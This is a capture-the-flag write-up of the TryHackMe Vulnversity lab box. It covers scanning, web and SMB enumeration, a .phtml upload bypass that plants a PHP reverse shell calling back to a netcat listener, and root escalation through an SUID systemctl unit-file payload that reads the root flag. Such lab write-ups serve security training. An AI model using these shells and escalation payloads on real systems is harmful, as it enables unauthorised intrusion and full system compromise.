---
date: 2024-10-18
title: VulnVersity THM Write-Up
machine_ip: varies
os: Linux
difficulty: Easy
my_rating: 2
tags:
  - Linux
  - PrivEsc
  - rustscan
  - feroxbuster
  - whatweb
  - SUID
  - systemctl
  - GTFOBins
  - php
  - nc
references: "[[📚CTF Box Writeups]]"
---

# Enumeration

- Rustscan
```
┌──(root㉿kali)-[~]
└─# rustscan -a 10.10.239.252 -t 2000 -b 2000 -- -A -sVC -Pn    
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
To scan or not to scan? That is the question.

[~] The config file is expected to be at "/root/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.10.239.252:22
Open 10.10.239.252:21
Open 10.10.239.252:139
Open 10.10.239.252:3128
Open 10.10.239.252:445
Open 10.10.239.252:3333
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -A -sVC -Pn" on ip 10.10.239.252
Depending on the complexity of the script, results may take some time to appear.
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-18 12:20 PDT
NSE: Loaded 156 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 12:20
Completed NSE at 12:20, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 12:20
Completed NSE at 12:20, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 12:20
Completed NSE at 12:20, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 12:20
Completed Parallel DNS resolution of 1 host. at 12:20, 0.04s elapsed
DNS resolution of 1 IPs took 0.04s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating SYN Stealth Scan at 12:20
Scanning 10.10.239.252 [6 ports]
Discovered open port 3333/tcp on 10.10.239.252
Discovered open port 3128/tcp on 10.10.239.252
Discovered open port 445/tcp on 10.10.239.252
Discovered open port 21/tcp on 10.10.239.252
Discovered open port 139/tcp on 10.10.239.252
Discovered open port 22/tcp on 10.10.239.252
Completed SYN Stealth Scan at 12:20, 0.16s elapsed (6 total ports)
Initiating Service scan at 12:20
Scanning 6 services on 10.10.239.252
Completed Service scan at 12:21, 22.10s elapsed (6 services on 1 host)
Initiating OS detection (try #1) against 10.10.239.252
Retrying OS detection (try #2) against 10.10.239.252
Initiating Traceroute at 12:21
Completed Traceroute at 12:21, 3.01s elapsed
Initiating Parallel DNS resolution of 2 hosts. at 12:21
Completed Parallel DNS resolution of 2 hosts. at 12:21, 0.04s elapsed
DNS resolution of 2 IPs took 0.04s. Mode: Async [#: 1, OK: 0, NX: 2, DR: 0, SF: 0, TR: 2, CN: 0]
NSE: Script scanning 10.10.239.252.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 12:21
Completed NSE at 12:21, 5.19s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 12:21
Completed NSE at 12:21, 1.03s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 12:21
Completed NSE at 12:21, 0.00s elapsed
Nmap scan report for 10.10.239.252
Host is up, received user-set (0.14s latency).
Scanned at 2024-10-18 12:20:49 PDT for 36s

PORT     STATE SERVICE     REASON         VERSION
21/tcp   open  ftp         syn-ack ttl 61 vsftpd 3.0.3
22/tcp   open  ssh         syn-ack ttl 61 OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 5a:4f:fc:b8:c8:76:1c:b5:85:1c:ac:b2:86:41:1c:5a (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDYQExoU9R0VCGoQW6bOwg0U7ILtmfBQ3x/rdK8uuSM/fEH80hgG81Xpqu52siXQXOn1hpppYs7rpZN+KdwAYYDmnxSPVwkj2yXT9hJ/fFAmge3vk0Gt5Kd8q3CdcLjgMcc8V4b8v6UpYemIgWFOkYTzji7ZPrTNlo4HbDgY5/F9evC9VaWgfnyiasyAT6aio4hecn0Sg1Ag35NTGnbgrMmDqk6hfxIBqjqyYLPgJ4V1QrqeqMrvyc6k1/XgsR7dlugmqXyICiXu03zz7lNUf6vuWT707yDi9wEdLE6Hmah78f+xDYUP7iNA0raxi2H++XQjktPqjKGQzJHemtPY5bn
|   256 ac:9d:ec:44:61:0c:28:85:00:88:e9:68:e9:d0:cb:3d (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHCK2yd1f39AlLoIZFsvpSlRlzyO1wjBoVy8NvMp4/6Db2TJNwcUNNFjYQRd5EhxNnP+oLvOTofBlF/n0ms6SwE=
|   256 30:50:cb:70:5a:86:57:22:cb:52:d9:36:34:dc:a5:58 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGqh93OTpuL32KRVEn9zL/Ybk+5mAsT/81axilYUUvUB
139/tcp  open  netbios-ssn syn-ack ttl 61 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn syn-ack ttl 61 Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
3128/tcp open  http-proxy  syn-ack ttl 61 Squid http proxy 3.5.12
|_http-server-header: squid/3.5.12
|_http-title: ERROR: The requested URL could not be retrieved
3333/tcp open  http        syn-ack ttl 61 Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-methods: 
|_  Supported Methods: OPTIONS GET HEAD POST
|_http-title: Vuln University
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Linux 3.10 - 3.13 (95%), ASUS RT-N56U WAP (Linux 3.4) (95%), Linux 3.16 (95%), Linux 5.4 (94%), Linux 3.1 (93%), Linux 3.2 (93%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (93%), Sony Android TV (Android 5.0) (93%), Android 5.0 - 6.0.1 (Linux 3.4) (93%), Android 5.1 (93%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.94SVN%E=4%D=10/18%OT=21%CT=%CU=30825%PV=Y%DS=4%DC=T%G=N%TM=6712B535%P=x86_64-pc-linux-gnu)
SEQ(SP=107%GCD=1%ISR=109%TI=Z%CI=I%II=I%TS=8)
OPS(O1=M509ST11NW6%O2=M509ST11NW6%O3=M509NNT11NW6%O4=M509ST11NW6%O5=M509ST11NW6%O6=M509ST11)
WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)
ECN(R=Y%DF=Y%T=40%W=6903%O=M509NNSNW6%CC=Y%Q=)
T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)
IE(R=Y%DFI=N%T=40%CD=S)

Uptime guess: 0.001 days (since Fri Oct 18 12:19:25 2024)
Network Distance: 4 hops
TCP Sequence Prediction: Difficulty=263 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: Host: VULNUNIVERSITY; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 60705/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 12206/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 56362/udp): CLEAN (Failed to receive data)
|   Check 4 (port 65044/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| nbstat: NetBIOS name: VULNUNIVERSITY, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| Names:
|   VULNUNIVERSITY<00>   Flags: <unique><active>
|   VULNUNIVERSITY<03>   Flags: <unique><active>
|   VULNUNIVERSITY<20>   Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
|   WORKGROUP<00>        Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|   WORKGROUP<1e>        Flags: <group><active>
| Statistics:
|   00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00
|   00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00
|_  00:00:00:00:00:00:00:00:00:00:00:00:00:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2024-10-18T19:21:03
|_  start_date: N/A
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: vulnuniversity
|   NetBIOS computer name: VULNUNIVERSITY\x00
|   Domain name: \x00
|   FQDN: vulnuniversity
|_  System time: 2024-10-18T15:21:03-04:00
|_clock-skew: mean: 1h19m43s, deviation: 2h18m34s, median: -17s

TRACEROUTE (using port 3333/tcp)
HOP RTT       ADDRESS
1   81.65 ms  10.6.0.1
2   ... 3
4   144.85 ms 10.10.239.252

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 12:21
Completed NSE at 12:21, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 12:21
Completed NSE at 12:21, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 12:21
Completed NSE at 12:21, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 36.01 seconds
           Raw packets sent: 69 (4.704KB) | Rcvd: 64 (24.814KB)

```
- We find ports 21, 22, 139, 445, 3128, 3333
	- 3128 and 3333 are http ports

- Web enumeration
	- feroxbuster for port 3128 does not return any directories. But for port 3333 it does:
```
┌──(root㉿kali)-[~]
└─# feroxbuster -k --url http://10.10.239.252:3333 --filter-status 400,404,403 
                                                                                                                                                            
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.239.252:3333
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 💢  Status Code Filters   │ [400, 404, 403]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔓  Insecure              │ true
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        9l       32w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET       11l       32w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
301      GET        9l       28w      318c http://10.10.239.252:3333/js => http://10.10.239.252:3333/js/
301      GET        9l       28w      322c http://10.10.239.252:3333/images => http://10.10.239.252:3333/images/
301      GET        9l       28w      319c http://10.10.239.252:3333/css => http://10.10.239.252:3333/css/
200      GET       72l      133w     1588c http://10.10.239.252:3333/css/jquery.timepicker.css
200      GET      205l     1368w     8111c http://10.10.239.252:3333/js/jquery.easing.1.3.js
200      GET      215l     1394w    11421c http://10.10.239.252:3333/js/jquery-migrate-3.0.1.min.js
200      GET      351l      795w     6950c http://10.10.239.252:3333/css/magnific-popup.css
200      GET       32l      239w     7447c http://10.10.239.252:3333/js/scrollax.min.js
200      GET       43l       94w     1265c http://10.10.239.252:3333/css/flaticon.css
200      GET        1l        6w     9467c http://10.10.239.252:3333/css/open-iconic-bootstrap.min.css
200      GET        7l      152w     8835c http://10.10.239.252:3333/js/jquery.waypoints.min.js
200      GET       15l       51w      965c http://10.10.239.252:3333/css/owl.theme.default.min.css
200      GET       62l      191w     1946c http://10.10.239.252:3333/js/google-map.js
200      GET        6l       73w     3440c http://10.10.239.252:3333/css/owl.carousel.min.css
200      GET      308l      631w     6769c http://10.10.239.252:3333/js/main.js
200      GET        8l       28w     1391c http://10.10.239.252:3333/js/jquery.animateNumber.min.js
200      GET        4l      212w    20216c http://10.10.239.252:3333/js/jquery.magnific-popup.min.js
200      GET        7l      285w    15764c http://10.10.239.252:3333/js/jquery.timepicker.min.js
200      GET        2l      220w    25983c http://10.10.239.252:3333/css/aos.css
200      GET      512l     1690w    17945c http://10.10.239.252:3333/css/bootstrap-datepicker.css
200      GET        5l      347w    19032c http://10.10.239.252:3333/js/popper.min.js
200      GET        2l      284w    14244c http://10.10.239.252:3333/js/aos.js
200      GET      652l     2357w    33014c http://10.10.239.252:3333/index.html
200      GET        2l       72w    12597c http://10.10.239.252:3333/js/jquery.stellar.min.js
200      GET        4l       55w     2865c http://10.10.239.252:3333/images/loc.png
200      GET       35l      179w     5340c http://10.10.239.252:3333/css/ajax-loader.gif
200      GET        7l      570w    50676c http://10.10.239.252:3333/js/bootstrap.min.js
200      GET     1671l     4509w    46820c http://10.10.239.252:3333/js/bootstrap-datepicker.js
200      GET       11l       46w    46816c http://10.10.239.252:3333/css/ionicons.min.css
200      GET        7l      287w    43237c http://10.10.239.252:3333/js/owl.carousel.min.js
200      GET       55l      324w    28756c http://10.10.239.252:3333/images/person_9.jpg
200      GET      278l     1407w   109682c http://10.10.239.252:3333/images/image_1.jpg
200      GET     3377l     7494w    73641c http://10.10.239.252:3333/css/animate.css
200      GET      418l     1701w   157952c http://10.10.239.252:3333/images/image_3.jpg
200      GET     4919l     8218w    79875c http://10.10.239.252:3333/css/icomoon.css
200      GET      272l      530w     4868c http://10.10.239.252:3333/css/css/bootstrap-reboot.css
200      GET       44l       98w      998c http://10.10.239.252:3333/js/range.js
200      GET      272l      535w     4886c http://10.10.239.252:3333/css/bootstrap/bootstrap-reboot.css
200      GET      389l     2229w   190422c http://10.10.239.252:3333/images/image_2.jpg
200      GET      366l     1947w   181827c http://10.10.239.252:3333/images/event-3.jpg
200      GET      198l     1318w   110075c http://10.10.239.252:3333/images/course-5.jpg
200      GET      358l     2304w   196870c http://10.10.239.252:3333/images/event-1.jpg
301      GET        9l       28w      324c http://10.10.239.252:3333/internal => http://10.10.239.252:3333/internal/
200      GET      137l      843w    64169c http://10.10.239.252:3333/images/person_1.jpg
200      GET      180l      898w    62057c http://10.10.239.252:3333/images/person_3.jpg
301      GET        9l       28w      321c http://10.10.239.252:3333/fonts => http://10.10.239.252:3333/fonts/
200      GET        4l     1298w    86658c http://10.10.239.252:3333/js/jquery-3.2.1.min.js
200      GET      730l     4012w   318152c http://10.10.239.252:3333/images/event-2.jpg
200      GET        0l        0w        0c http://10.10.239.252:3333/css/css/mixins/_text-hide.css
200      GET      381l     1609w   131091c http://10.10.239.252:3333/images/course-4.jpg
200      GET     9397l    25506w   252996c http://10.10.239.252:3333/css/style.css
200      GET        7l     1604w   140421c http://10.10.239.252:3333/css/bootstrap.min.css
200      GET      125l     1194w    98910c http://10.10.239.252:3333/images/event-4.jpg
200      GET      431l     1933w   151467c http://10.10.239.252:3333/images/course-2.jpg
200      GET    10253l    40950w   268038c http://10.10.239.252:3333/js/jquery.min.js
200      GET     1708l     4570w    45805c http://10.10.239.252:3333/css/bootstrap/bootstrap-grid.css
200      GET     1089l     5760w   510198c http://10.10.239.252:3333/images/bg_3.jpg
301      GET        9l       28w      332c http://10.10.239.252:3333/internal/uploads => http://10.10.239.252:3333/internal/uploads/
200      GET      414l     2481w   190114c http://10.10.239.252:3333/images/image_4.jpg
200      GET       59l      373w    27000c http://10.10.239.252:3333/fonts/open-iconic/open-iconic.woff
200      GET      179l     1710w    36039c http://10.10.239.252:3333/fonts/open-iconic/open-iconic.eot
200      GET      201l      574w    39846c http://10.10.239.252:3333/fonts/open-iconic/open-iconic.otf
200      GET     2520l    13107w  1051940c http://10.10.239.252:3333/images/bg_1.jpg
200      GET      652l     2357w    33014c http://10.10.239.252:3333/
200      GET      470l     2546w   215485c http://10.10.239.252:3333/images/course-3.jpg
200      GET      543l     7786w    54789c http://10.10.239.252:3333/fonts/open-iconic/open-iconic.svg
301      GET        9l       28w      328c http://10.10.239.252:3333/internal/css => http://10.10.239.252:3333/internal/css/
200      GET      339l     1774w   169336c http://10.10.239.252:3333/images/course-1.jpg
200      GET      121l      601w    44350c http://10.10.239.252:3333/images/person_4.jpg
200      GET      405l     2081w    60555c http://10.10.239.252:3333/fonts/flaticon/license/license.pdf
200      GET     2522l    10324w   355925c http://10.10.239.252:3333/fonts/icomoon/icomoon.ttf
200      GET       23l      231w     4445c http://10.10.239.252:3333/fonts/flaticon/font/Flaticon.eot
200      GET       12l       71w     4429c http://10.10.239.252:3333/fonts/flaticon/font/Flaticon.woff
200      GET       47l       98w     1292c http://10.10.239.252:3333/fonts/flaticon/font/_flaticon.scss
200      GET       35l       80w      970c http://10.10.239.252:3333/fonts/flaticon/font/flaticon.css
200      GET      111l     1796w    18821c http://10.10.239.252:3333/fonts/flaticon/font/Flaticon.svg
200      GET      212l     1141w    91571c http://10.10.239.252:3333/fonts/ionicons/fonts/ionicons.woff2
200      GET      475l     1097w    17728c http://10.10.239.252:3333/fonts/flaticon/font/flaticon.html
200      GET      262l     1450w   119996c http://10.10.239.252:3333/fonts/ionicons/fonts/ionicons.woff
200      GET      179l     1705w    35867c http://10.10.239.252:3333/fonts/open-iconic/open-iconic.ttf
200      GET     2522l    10327w   356021c http://10.10.239.252:3333/fonts/icomoon/icomoon.woff
200      GET      522l     3133w   261437c http://10.10.239.252:3333/images/image_6.jpg
200      GET       23l      227w     4257c http://10.10.239.252:3333/fonts/flaticon/font/Flaticon.ttf
200      GET     1480l     4487w    57268c http://10.10.239.252:3333/fonts/ionicons/css/_ionicons.scss
200      GET     1250l     5103w   130464c http://10.10.239.252:3333/fonts/ionicons/fonts/ionicons.ttf
200      GET     1250l     5106w   130654c http://10.10.239.252:3333/fonts/ionicons/fonts/ionicons.eot
200      GET       12l     3898w   170032c http://10.10.239.252:3333/internal/css/bootstrap.min.css
200      GET     1598l     9778w   799181c http://10.10.239.252:3333/images/bg_2.jpg
200      GET       11l       46w    51284c http://10.10.239.252:3333/fonts/ionicons/css/ionicons.min.css
200      GET     2094l    61292w   313199c http://10.10.239.252:3333/fonts/ionicons/fonts/ionicons.svg
200      GET     1530l    71755w   935341c http://10.10.239.252:3333/fonts/icomoon/icomoon.svg
200      GET      221l     1450w    89759c http://10.10.239.252:3333/images/person_5.jpg
200      GET      553l     2819w   211209c http://10.10.239.252:3333/images/person_8.jpg
200      GET      315l     1727w   139498c http://10.10.239.252:3333/images/event-6.jpg
200      GET      292l     3064w   198556c http://10.10.239.252:3333/images/person_7.jpg
200      GET      293l     1468w    92796c http://10.10.239.252:3333/images/course-6.jpg
200      GET      167l     1086w    83261c http://10.10.239.252:3333/images/person_2.jpg
200      GET      775l     4034w   319835c http://10.10.239.252:3333/images/image_5.jpg
200      GET      698l     3936w   311367c http://10.10.239.252:3333/images/event-5.jpg
200      GET     1043l     6412w   457605c http://10.10.239.252:3333/images/person_6.jpg
200      GET        1l        1w      688c http://10.10.239.252:3333/fonts/flaticon/backup.txt
200      GET      719l     6717w   462562c http://10.10.239.252:3333/images/bg_4.jpg
200      GET     2522l    10325w   356098c http://10.10.239.252:3333/fonts/icomoon/icomoon.eot

```
- `http://10.10.239.252:3333/internal/` loads a page where we can upload a `jpg` file...
- `http://10.10.239.252:3333/internal/uploads/` shows uploaded files
	- we can probably get a reverse shell this way

- whatweb port 3333
```
┌──(root㉿kali)-[~]
└─# whatweb 10.10.239.252:3333
http://10.10.239.252:3333 [200 OK] Apache[2.4.18], Bootstrap, Country[RESERVED][ZZ], Email[info@yourdomain.com], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.10.239.252], JQuery, Script, Title[Vuln University]
```
- whatweb port 3128
```
┌──(root㉿kali)-[~/Transfer]
└─# whatweb 10.10.225.134:3128
http://10.10.225.134:3128 [400 Bad Request] Content-Language[en], Country[RESERVED][ZZ], Email[webmaster], HTTPServer[squid/3.5.12], IP[10.10.225.134], Squid-Web-Proxy-Cache[3.5.12], Title[ERROR: The requested URL could not be retrieved], UncommonHeaders[x-squid-error], Via-Proxy[1.1 vulnuniversity (squid/3.5.12)], X-Cache[vulnuniversity,vulnuniversity:3128]
```

- #Apache 2.4.18 on port 3333
- #squid 3.5.12 on port 3128

- Scan port 139 - #NetBios 
```
┌──(root㉿kali)-[~/Transfer]
└─# nbtscan -r 10.10.239.252    
Doing NBT name scan for addresses from 10.10.239.252

IP address       NetBIOS Name     Server    User             MAC address      
------------------------------------------------------------------------------
10.10.239.252    VULNUNIVERSITY   <server>  VULNUNIVERSITY   00:00:00:00:00:00
```

- Enumerating #SMB shows two shares, IPC$ and print$ using #smbclient 
```
┌──(root㉿kali)-[~/Transfer]
└─# smbclient -N -L \\\\10.10.239.252       

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        IPC$            IPC       IPC Service (vulnuniversity server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP            VULNUNIVERSITY

```

- We can log into the IPC$ share
```
┌──(root㉿kali)-[~/Transfer]
└─# smbclient -U "" -N \\\\10.10.239.252\\IPC$
Try "help" to get a list of possible commands.
smb: \>
```

- Back to figuring out #InsecureFileUpload at `http://10.10.239.252:3333/internal/` and `http://10.10.239.252:3333/internal/uploads/`
- Eventually get a `.php` file to upload using the `.phtml` extension. Tried multiple from [here](https://book.hacktricks.xyz/pentesting-web/file-upload)

---
# Foothold

- gain shell via exploit
- Using [this](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) reverse #php shell, and the `.phtml` extension, I uploaded the revshell to `http://10.10.239.252:3333/internal/`.
- When we navigate to `http://10.10.239.252:3333/internal/uploads/phprevshell.phtml`, we get a web server shell
```
┌──(root㉿kali)-[~/Transfer]
└─# nc -lnvp 443
listening on [any] 443 ...
connect to [10.6.15.124] from (UNKNOWN) [10.10.225.134] 57050
Linux vulnuniversity 4.4.0-142-generic #168-Ubuntu SMP Wed Jan 16 21:00:45 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
 16:39:51 up 18 min,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
```

- Let's upgrade the shell
```
$ python -c 'import pty; pty.spawn("/bin/bash")'

www-data@vulnuniversity:/var/www$ 
```

- We find `bill` in the `/home` directory
- User flag - bill
```
www-data@vulnuniversity:/home/bill$ cat user.txt
cat user.txt
8bd7992fbe8a6ad22a63361004cfcedb
```

---
# PrivEsc

- escalate to root
- Search for #SUID binaries and compare to [GTFOBins](https://gtfobins.github.io/#+suid) 
	- Binaries with SUIDs set and found on [GTFOBins](https://gtfobins.github.io/#+suid) 
		- `/bin/systemctl` #systemctl 
```
www-data@vulnuniversity:/$ find / -type f -perm -04000 -ls 2>/dev/null
find / -type f -perm -04000 -ls 2>/dev/null
   402892     36 -rwsr-xr-x   1 root     root        32944 May 16  2017 /usr/bin/newuidmap
   393361     52 -rwsr-xr-x   1 root     root        49584 May 16  2017 /usr/bin/chfn
   402893     36 -rwsr-xr-x   1 root     root        32944 May 16  2017 /usr/bin/newgidmap
   393585    136 -rwsr-xr-x   1 root     root       136808 Jul  4  2017 /usr/bin/sudo
   393363     40 -rwsr-xr-x   1 root     root        40432 May 16  2017 /usr/bin/chsh
   393501     56 -rwsr-xr-x   1 root     root        54256 May 16  2017 /usr/bin/passwd
   406711     24 -rwsr-xr-x   1 root     root        23376 Jan 15  2019 /usr/bin/pkexec
   393490     40 -rwsr-xr-x   1 root     root        39904 May 16  2017 /usr/bin/newgrp
   393424     76 -rwsr-xr-x   1 root     root        75304 May 16  2017 /usr/bin/gpasswd
   405497     52 -rwsr-sr-x   1 daemon   daemon      51464 Jan 14  2016 /usr/bin/at
   406941    100 -rwsr-sr-x   1 root     root        98440 Jan 29  2019 /usr/lib/snapd/snap-confine
   406710     16 -rwsr-xr-x   1 root     root        14864 Jan 15  2019 /usr/lib/policykit-1/polkit-agent-helper-1
   405145    420 -rwsr-xr-x   1 root     root       428240 Jan 31  2019 /usr/lib/openssh/ssh-keysign
   393687     12 -rwsr-xr-x   1 root     root        10232 Mar 27  2017 /usr/lib/eject/dmcrypt-get-device
   666971     76 -rwsr-xr-x   1 root     root        76408 Jul 17  2019 /usr/lib/squid/pinger
   402037     44 -rwsr-xr--   1 root     messagebus    42992 Jan 12  2017 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
   402829     40 -rwsr-xr-x   1 root     root          38984 Jun 14  2017 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
   131164     40 -rwsr-xr-x   1 root     root          40128 May 16  2017 /bin/su
   133166    140 -rwsr-xr-x   1 root     root         142032 Jan 28  2017 /bin/ntfs-3g
   131133     40 -rwsr-xr-x   1 root     root          40152 May 16  2018 /bin/mount
   131148     44 -rwsr-xr-x   1 root     root          44680 May  7  2014 /bin/ping6
   131182     28 -rwsr-xr-x   1 root     root          27608 May 16  2018 /bin/umount
   131166    648 -rwsr-xr-x   1 root     root         659856 Feb 13  2019 /bin/systemctl
   131147     44 -rwsr-xr-x   1 root     root          44168 May  7  2014 /bin/ping
   133163     32 -rwsr-xr-x   1 root     root          30800 Jul 12  2016 /bin/fusermount
   405750     36 -rwsr-xr-x   1 root     root          35600 Mar  6  2017 /sbin/mount.cifs
```

- To exploit `systemctl` SUID binary change the GTFOBins payload:
```
sudo install -m =xs $(which systemctl) .

TF=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "id > /tmp/output"
[Install]
WantedBy=multi-user.target' > $TF
./systemctl link $TF
./systemctl enable --now $TF
```
- To this:
```
TF=$(mktemp).service
echo '[Service]
ExecStart=/bin/sh -c "cat /root/root.txt > /tmp/output"
[Install]
WantedBy=multi-user.target' > $TF
/bin/systemctl link $TF
/bin/systemctl enable --now $TF
```
- Enter each line in the command line and cat the `/tmp/output` for root flag!
```
www-data@vulnuniversity:/$ echo '[Service]
echo '[Service]
> ExecStart=/bin/sh -c "cat /root/root.txt > /tmp/output"
ExecStart=/bin/sh -c "cat /root/root.txt > /tmp/output"
> [Install]
[Install]
> WantedBy=multi-user.target' > $TF
WantedBy=multi-user.target' > $TF
www-data@vulnuniversity:/$ /bin/systemctl link $TF
/bin/systemctl link $TF
Created symlink from /etc/systemd/system/tmp.1AJwxzlEep.service to /tmp/tmp.1AJwxzlEep.service.
www-data@vulnuniversity:/$ /bin/systemctl enable --now $TF
/bin/systemctl enable --now $TF
Created symlink from /etc/systemd/system/multi-user.target.wants/tmp.1AJwxzlEep.service to /tmp/tmp.1AJwxzlEep.service.
```

- Root flag
```
www-data@vulnuniversity:/$ cat /tmp/output
cat /tmp/output
a58ff8579f0a9270368d33a9966c7fd5
```